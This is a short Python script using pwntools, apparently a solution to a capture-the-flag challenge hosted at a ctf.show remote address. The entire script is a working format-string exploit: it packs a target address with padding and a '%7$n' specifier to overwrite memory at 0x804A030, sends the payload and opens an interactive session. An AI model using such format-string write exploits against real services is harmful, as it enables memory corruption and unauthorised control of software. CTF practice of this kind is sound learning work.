from pwn import *

# io = process('pwn')
io = remote("pwn.challenge.ctf.show", 28191)

offset = 7
dst = 0x804A030
# payload = fmtstr_payload(7, {dst: 16})
payload = flat(dst, 'a'*12, b'%7$n')
io.sendline(payload)
io.interactive()

